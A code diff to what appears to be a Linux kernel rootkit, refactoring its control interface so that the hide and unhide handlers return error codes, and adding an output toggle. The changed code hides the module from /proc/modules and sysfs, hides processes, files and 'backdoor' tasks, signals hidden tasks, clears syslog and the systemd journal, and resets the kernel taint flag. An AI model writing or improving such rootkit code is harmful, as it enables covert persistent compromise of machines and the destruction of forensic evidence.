@@ -171,7 +171,7 @@ error_out:
  * Remove the module entries
  * in /proc/modules and /sys/module/<MODNAME>
  * Also backup references needed for
- * kv_unhide_mod()
+ * _unhide_mod()
  */
 struct rmmod_controller {
 	struct kobject *parent;
@@ -186,12 +186,12 @@ static inline void kv_list_del(struct list_head *prev, struct list_head *next)
 	prev->next = next;
 }
 
-static void kv_hide_mod(void)
+static int _hide_mod(void)
 {
 	struct list_head this_list;
 
 	if (NULL != mod_list)
-		return;
+		return -EINVAL;
 	/*
      *  sysfs looks more and less
      *  like this, before removal:
@@ -246,6 +246,8 @@ static void kv_hide_mod(void)
 	/* __module_address will return NULL for us
      * as long as we are "loading"... */
 	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
+
+	return 0;
 }
 
 /*
@@ -254,13 +256,13 @@ static void kv_hide_mod(void)
  * executed, the recommended action is to proceed with the rmmod
  * command to unload the module safely.
  */
-static void kv_unhide_mod(void)
+static int _unhide_mod(void)
 {
 	int err;
 	struct kobject *kobj;
 
 	if (!mod_list)
-		return;
+		return -EINVAL;
 
 	/*
      * Sysfs is intrinsically linked to kernel objects. In this section,
@@ -326,6 +328,8 @@ out_put_kobj:
 	/** Decrement refcount */
 	kobject_put(&(lkmmod.this_mod->mkobj.kobj));
 	mod_list = NULL;
+
+	return err;
 }
 
 struct msguser_t {
@@ -336,7 +340,7 @@ static struct msguser_t MsgUser;
 
 enum { MSG_INT, MSG_ULONG, MSG_ADDR };
 
-void kv_set_msguser(void *bytes, int type)
+void _set_msguser(void *bytes, int type)
 {
 	spin_lock(&msguser_spin);
 
@@ -370,6 +374,23 @@ void kv_set_msguser(void *bytes, int type)
 	}
 
 	spin_unlock(&msguser_spin);
+}
+void kv_set_msguser(void *bytes, int type)
+{
+	_set_msguser(bytes, type);
+}
+
+static bool msguser_enable;
+static void _set_msguser_retcode(void *bytes, int type)
+{
+	if (msguser_enable)
+		_set_msguser(bytes, type);
+}
+
+static inline void _msguser_toggle(void)
+{
+	msguser_enable = !msguser_enable;
+	_set_msguser(&msguser_enable, MSG_INT);
 }
 
 /** XXX: fix/improve this API */
@@ -489,6 +510,7 @@ enum {
 	Opt_signal_task_kill,
 	Opt_syslog_clear,
 	Opt_taint_clear,
+	Opt_output_enable,
 
 #ifdef DEBUG_RING_BUFFER
 	/**debug */
@@ -522,6 +544,7 @@ static const match_table_t tokens = {
 	{ Opt_signal_task_kill, "signal-task-kill=%d" },
 	{ Opt_syslog_clear, "syslog-clear" },
 	{ Opt_taint_clear, "taint-clear" },
+	{ Opt_output_enable, "output-enable" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -552,26 +575,34 @@ void _crypto_cb(const u8 *const buf, size_t buflen, size_t copied,
 #ifdef DEBUG_RING_BUFFER
 	else if (validate->op == Opt_get_unhidekey ||
 		 validate->op == Opt_get_bdkey) {
-		uint64_t val = *((uint64_t *)buf); 
+		uint64_t val = *((uint64_t *)buf);
 		kv_set_msguser(&val, MSG_ADDR);
 	}
 #endif
 }
-static void _run_send_sig(int sig, pid_t pid, bool restart)
+static int _run_send_sig(int sig, pid_t pid, bool restart)
 {
+	int rc = -ESRCH;
 	struct hidden_status status = { 0 };
-	if (kv_find_hidden_pid(&status, pid)) {
-		kv_hide_task_by_pid(pid, 0, CHILDREN);
-		kv_send_signal(sig, status.task);
-		if (restart)
-			kv_hide_task_by_pid(pid, 0, CHILDREN);
+
+	if (!kv_find_hidden_pid(&status, pid))
+		return rc;
+
+	rc = kv_hide_task_by_pid(pid, 0, CHILDREN);
+	if (!rc) {
+		rc = kv_send_signal(sig, status.task);
+		if (restart) {
+			rc = kv_hide_task_by_pid(pid, 0, CHILDREN);
+		}
 	}
+	return rc;
 }
 
-static void hide_path(const char *s)
+static int _hide_path(const char *s)
 {
 	struct path path;
 	struct kstat stat = { 0 };
+	int rc = -EINVAL;
 
 	if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
 		/** It is filename, no problem because we have path.dentry */
@@ -580,24 +611,27 @@ static void hide_path(const char *s)
 
 		if (is_dir) {
 			u64 parent_inode = fs_get_parent_inode(&path);
-			fs_add_name_rw_dir(f, stat.ino, parent_inode,
-					   /*is_dir=*/true);
+			rc = fs_add_name_rw_dir(f, stat.ino, parent_inode,
+						/*is_dir=*/true);
 		} else {
-			fs_add_name_rw(f, stat.ino);
+			rc = fs_add_name_rw(f, stat.ino);
 		}
 
 		path_put(&path);
 		kv_mem_free(&f);
 	} else if (*s != '.' && *s != '/') {
 		/** add with unknown inode number */
-		fs_add_name_rw(s, /*ino=*/0);
+		rc = fs_add_name_rw(s, /*ino=*/0);
 	}
+
+	return rc;
 }
 
 #define CMD_MAXLEN 128
 static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			loff_t *offset)
 {
+	int rc = -EINVAL;
 	pid_t pid;
 	char param[CMD_MAXLEN + 1] = { 0 };
 	decrypt_callback user_cb = (decrypt_callback)_crypto_cb;
@@ -610,7 +644,8 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 
 	pid = (pid_t)simple_strtol((const char *)param, NULL, 10);
 	if (pid > 1) {
-		kv_hide_task_by_pid(pid, 0, CHILDREN);
+		rc = kv_hide_task_by_pid(pid, 0, CHILDREN);
+		_set_msguser_retcode(&rc, MSG_INT);
 	} else {
 		substring_t args[MAX_OPT_ARGS];
 
@@ -621,7 +656,8 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			break;
 		case Opt_hide_task_backdoor:
 			if (sscanf(args[0].from, "%d", &pid) == 1)
-				kv_hide_task_by_pid(pid, 1, CHILDREN);
+				rc = kv_hide_task_by_pid(pid, 1, CHILDREN);
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_list_hidden_tasks:
 			kv_show_saved_tasks();
@@ -631,10 +667,12 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			break;
 		case Opt_rename_hidden_task:
 			if (sscanf(args[0].from, "%d", &pid) == 1)
-				kv_rename_task(pid, args[1].from);
+				rc = kv_rename_task(pid, args[1].from);
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_hide_module:
-			kv_hide_mod();
+			rc = _hide_mod();
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_unhide_module: {
 			uint64_t address_value = 0;
@@ -644,26 +682,31 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			     1)) {
 				validate.address_value = address_value;
 				validate.op = Opt_unhide_module;
+
 				kv_decrypt(kvmgc_unhidekey, user_cb, &validate);
 				if (validate.ok == true) {
-					kv_unhide_mod();
+					rc = _unhide_mod();
 				}
 			}
+			_set_msguser_retcode(&rc, MSG_INT);
 		} break;
 		case Opt_hide_file:
 		case Opt_hide_directory: {
 			char *s = args[0].from;
-			hide_path(s);
+			rc = _hide_path(s);
+			_set_msguser_retcode(&rc, MSG_INT);
 		} break;
 		case Opt_unhide_file:
 		case Opt_unhide_directory:
-			fs_del_name(args[0].from);
+			rc = fs_del_name(args[0].from);
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 			/** Currently, directories must
 			* be added individually: use hide-directory
 			*/
 		case Opt_hide_file_anywhere:
-			fs_add_name_rw(args[0].from, 0);
+			rc = fs_add_name_rw(args[0].from, 0);
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_list_hidden_files:
 			fs_list_names();
@@ -672,8 +715,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			char *cmd[] = { JOURNALCTL, "--rotate", NULL };
 			if (!kv_run_system_command(cmd, false, false)) {
 				cmd[1] = "--vacuum-time=1s";
-				kv_run_system_command(cmd, false, false);
+				rc = kv_run_system_command(cmd, false, false);
 			}
+			_set_msguser_retcode(&rc, MSG_INT);
 		} break;
 #ifdef DEBUG_RING_BUFFER
 		case Opt_get_bdkey:
@@ -695,18 +739,22 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		} break;
 		case Opt_signal_task_stop:
 			if (sscanf(args[0].from, "%d", &pid) == 1)
-				_run_send_sig(SIGSTOP, pid, true);
+				rc = _run_send_sig(SIGSTOP, pid, true);
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_signal_task_cont:
 			if (sscanf(args[0].from, "%d", &pid) == 1)
-				_run_send_sig(SIGCONT, pid, true);
+				rc = _run_send_sig(SIGCONT, pid, true);
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_signal_task_kill:
 			if (sscanf(args[0].from, "%d", &pid) == 1)
-				_run_send_sig(SIGKILL, pid, false);
+				rc = _run_send_sig(SIGKILL, pid, false);
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_syslog_clear:
-			sys_do_syslog_clear();
+			rc = sys_do_syslog_clear();
+			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_taint_clear: {
 			struct kernel_syscalls *kaddr = kv_kall_load_addr();
@@ -715,9 +763,12 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			if (kaddr)
 				oldmask = kv_reset_tainted(kaddr->tainted);
 			snprintf(uval, 32, "%d", oldmask);
-			kv_set_msguser(&oldmask, MSG_INT);
+			_set_msguser_retcode(&oldmask, MSG_INT);
 
 		} break;
+		case Opt_output_enable:
+			_msguser_toggle();
+			break;
 		default:
 			break;
 		}
@@ -975,7 +1026,7 @@ static int __init kv_init(void)
 	}
 
 #ifndef DEBUG_RING_BUFFER
-	kv_hide_mod();
+	_hide_mod();
 #endif
 
 	kv_reset_tainted(kaddr->tainted);
